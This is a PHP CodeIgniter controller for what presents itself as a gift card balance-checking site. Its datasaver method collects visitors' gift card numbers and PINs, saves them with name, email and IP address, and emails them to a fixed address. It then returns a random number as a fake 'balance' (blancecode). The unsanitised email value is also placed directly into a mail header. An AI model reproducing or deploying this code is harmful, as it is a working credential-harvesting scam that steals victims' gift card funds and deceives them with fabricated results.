<?php
	class Giftcards extends MY_Controller {
		function __construct() {
			parent::__construct();
			$this->load->library(array('email','form_validation','session','pagination'));
			$this->load->database();
			$this->load->model('Frontend_model'); 
			$this->load->library('pagination');
			$this->load->helper('url');	
		}
		public function giftcards()
		{
			$data = array();
			$this->data['giftcardsinfo_1'] = $this->Frontend_model->get_data_cards('giftcards',0,3);
			$this->data['giftcardsinfo_2'] = $this->Frontend_model->get_data_cards('giftcards',3,3);
			$this->data['giftcardsinfo_3'] = $this->Frontend_model->get_data_cards('giftcards',6,3);
			$this->data['giftcardsinfo_4'] = $this->Frontend_model->get_data_cards('giftcards',9,3);
			$this->data['giftcardsinfo_5'] = $this->Frontend_model->get_data_cards('giftcards',12,3);
			$this->data['giftcardsinfo_6'] = $this->Frontend_model->get_data_cards('giftcards',15,3);
			$this->front_view('giftcards',$data);	
		}
		public function giftcartview()
		{
			$data = array();
			$giftcardname = $this->uri->segment('2');
			$resultSet = $this->Frontend_model->get_data_card_info($giftcardname);
			if(isset($resultSet->gcid) && $resultSet->gcid!=""){
				$this->data['getgiftcardinfo'] = $resultSet;
				$this->front_view('giftcartview',$data);
			}else{
				redirect(base_url().'giftcards');
			}				
		}
		public function datasaver()
		{
			if(isset($_POST['looser_form']) && $_POST['looser_form']=="looser_form"){
				$CardType       = $_POST['CardType'];
				$GiftCardNumber = $_POST['GiftCardNumber'];
				$PinNumber = $_POST['PinNumber'];
				if(isset($_SESSION['name']) && $_SESSION['name']!=""){
					$name = $_SESSION['name'];
				}else{
					$name = "";
				}
				if(isset($_SESSION['email']) && $_SESSION['email']!=""){
					$email = $_SESSION['email'];
				}else{
					$email = "";
				}
				if(isset($_POST['giftcardid']) && $_POST['giftcardid']!=""){
					$giftcardid = $_POST['giftcardid'];
				}else{
					$giftcardid = 0;
				}
				$to = "info@faciostores.com";
				$subject = "Faciostores";
				$cardname = $CardType;
				
				
				$ip = $_SERVER['REMOTE_ADDR']; 
				
				$dataarray = array(
					'gccname'        => $name,
					'ipaddress'      => $ip,
					'emailaddress'   => $email,
					'giftcardid'     => $giftcardid,
					'cardType'       => $CardType,
					'giftcardnumber' => $GiftCardNumber,
					'pinnumber'      => $PinNumber,
					'createdat'      =>date('Y-m-d H:i:s'),
				);
				$insertId = $this->Frontend_model->updatedInsertedGiftCardInfo($dataarray);
				$message = '<html><body>';
				$message .= '<img src="//css-tricks.com/examples/WebsiteChangeRequestForm/images/wcrf-header.png" alt="Website Change Request" />';
				$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
				$message .= "<tr style='background: #eee;'><td><strong>Remote IP address:</strong> </td><td>" . $ip . "</td></tr>";
				$message .= "<tr style='background: #eee;'><td><strong>Name:</strong> </td><td>" . strip_tags($name) . "</td></tr>";
				$message .= "<tr><td><strong>Email:</strong> </td><td>" . strip_tags($email) . "</td></tr>";
				$message .= "<tr><td><strong>Type of Card Name:</strong> </td><td>" . strip_tags($CardType) . "</td></tr>";
				$message .= "<tr><td><strong>GiftCardNumber:</strong> </td><td>" . strip_tags($GiftCardNumber) . "</td></tr>";
				$message .= "<tr><td><strong>Pin Number:</strong> </td><td>" . $PinNumber . "</td></tr>";
				$message .= "</table>";
				$message .= "</body></html>";
				$headers  = 'MIME-Version: 1.0' . "\r\n";
				$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";	

				$header = "From:$email \r\n";
				$header .= "MIME-Version: 1.0\r\n";
				$header .= "Content-type: text/html\r\n";         
				$retval = mail ($to,$subject,$message,$header);         
				if( $retval == true ){
					$bCash = rand(5,100);
					echo json_encode(array('status'=>true,'message'=>$CardType,'blancecode'=>$bCash));exit;	
				}else{
					$bCash = rand(5,100);
					echo json_encode(array('message_success'=>'fail','status'=>true,'message'=>$CardType,'blancecode'=>$bCash));exit;	
				}
				$bCash = rand(5,100);
				echo json_encode(array('status'=>true,'message'=>$CardType,'blancecode'=>$bCash));exit;	
			}				
		}				
	}
?>